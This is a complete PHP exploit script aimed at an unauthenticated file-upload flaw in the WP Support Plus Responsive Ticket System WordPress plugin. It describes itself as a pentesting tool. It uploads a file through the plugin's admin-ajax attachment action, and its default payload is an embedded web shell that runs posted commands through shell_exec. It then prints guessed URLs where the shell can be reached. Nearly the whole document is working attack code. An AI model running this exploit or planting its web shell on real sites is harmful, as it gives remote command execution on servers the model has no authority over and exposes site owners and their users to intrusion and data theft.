<?php
$base_url = "";
$extension = "phtml";
$url_path = "/wp-admin/admin-ajax.php";
$upload_path = "/wp-content/uploads/wpsp/";

echo sprintf(
  "\r\n" .
  "__      ___ __  ___ _ ____      ___ __   \r\n" .
  "\ \ /\ / / '_ \/ __| '_ \ \ /\ / / '_ \  \r\n" .
  " \ V  V /| |_) \__ \ |_) \ V  V /| | | | \r\n" .
  "  \_/\_/ | .__/|___/ .__/ \_/\_/ |_| |_| \r\n" .
  "         |_|       |_|  %s\r\n\r\n",
  (!isset($argv[1])) ? "ASCII donations accepted!" : ""
);

if ( !isset($argv[1]) ) { // No args
  echo sprintf(
    "Affects 'WP Support Plus Responsive Ticket System' WordPress plugin <= 8.0.7\r\n\r\n" .
    "A test tool for automating wordpress pentesting. \r\n\r\n" .
    "Usage: php %s <target> <payload> <extension>\r\n\r\n" .
    "<target>\tWordPress install directory URL\r\n" .
    "<payload>\t(optional) PHP Payload\r\n" .
    "<extension>\t(optional) File extension\r\n\t\tAccepts: php, php3, php4, php5, php7, pht, phtml\r\n\r\n" .
    "Stick to HTTP, avoid HTTPS.\r\n\r\nHave phun! \r\n\r\n",
    basename(__FILE__)
  );
  die();
}

if ( !filter_var($argv[1], FILTER_VALIDATE_URL) ) { // Bad URL
  throw new Exception("\r\nIncorrect wordpress install URL format.\r\n\r\n--\r\n\r\n");
  die();
}
else {
  $base_url = $argv[1];
}

if (isset($argv[2])) { // Custom payload
  echo 'arg 2 sent';
  $payload_filename = $argv[2];
}
else {
  $default_payload = '<?php if(!empty($_POST["c"])){$c=$_POST["e"]($_POST["c"]);}?><html><body><form action="" method="POST"><input type="hidden" name="e" id="e" value="shell_exec"><input type="text" name="c" id="c" value="<?php echo htmlspecialchars($_POST["c"],ENT_QUOTES,"UTF-8")?>" placeholder="Command"><button type="submit">&gt;</button></form><?php if($c){ ?><br><br><pre><?php echo htmlspecialchars($c,ENT_QUOTES,"UTF-8")?></pre><?php }?></body></html>';
  $payload_filename = dirname(__FILE__) . sprintf( "tmp_%d.tmp", time() );
  file_put_contents($payload_filename, $default_payload);
}

if (isset($argv[3])) { // Custom extension
  $ext_options = array("php", "php3", "php4", "php5", "php7", "pht", "phtml");
  $extension = in_array($argv[3], $ext_options) ? $argv[3] : "phtml";
}

$post_data = array(
  'action' => 'wpsp_upload_attachment',
  '0' => curl_file_create($payload_filename, 'text/plain', '.'.$extension)
);

// Send request
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $base_url.$url_path);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$time_before = time();
$result = curl_exec($ch);
curl_close($ch);
$time_after = time();
$result = json_decode( $result );
$success = ($result->isError === "0");

echo sprintf(
  "Attempting exploit... %s\r\n\r\n",
  ($success) ? "OK!" : "FAILED."
);

if ($success) {
  for ($i=$time_before;$i<=$time_after;$i++) {
    $best_guess = ($time_after == $i);
    echo sprintf("%s%s%s_.%s%s\r\n\r\n", $base_url, $upload_path, $i, $extension, ($best_guess)?" <-- Best guess!":"");
    echo sprintf("If that doesn't work, fiddle with the number in the URL working backwards.\r\n\r\n");
  }
}
else {
  echo "Outputting response:\r\n";
  var_dump( $result );
  echo "\r\n\r\n";
}

// Remove payload if default
if (!isset($argv[2])) {
 unlink($payload_filename);
}

die();
